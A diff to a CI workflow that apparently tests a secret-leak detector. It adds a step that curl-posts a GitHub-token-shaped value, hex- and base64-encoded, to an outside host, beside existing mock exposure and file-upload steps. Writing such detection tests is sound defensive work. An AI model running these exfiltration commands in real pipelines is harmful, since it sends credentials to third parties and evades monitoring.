@@ -152,11 +152,17 @@ jobs:
             -F "file=@leaks64.zip" \
             -H "Content-Type: application/form-data"
             
-      - name: Mock API key exposure request
+      - name: Mock API key exposure request (Normal)
         run: |
           curl -X POST https://normalsecrets.com \
           -H "Content-Type: application/json" \
           -d '{"data":{"GH":"ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"}}'
+
+      - name: Mock API key exposure request (HEX to BASE64)
+        run: |
+          curl -X POST https://normalsecrets.com \
+          -H "Content-Type: application/json" \
+          -d '{"data":{"GH":"Njc2ODcwNWY0NDQ1NDY3YTZkNjczNzUyNDg3MjUxMzI2NTRkNjUzMjQ5NDYzNDRlNzg0ZTU3NTE2ZjY0NTk3MDYxNjIzMzU2NGQ1ODU4NTg="}}'
           
       - name: 3 level base64 encoding secrets
         run: |
@@ -196,3 +202,4 @@ jobs:
           app_token: ${{ secrets.IR_API_KEY_SECRET }}
           send_job_status: "true"
           debug: "true"
+
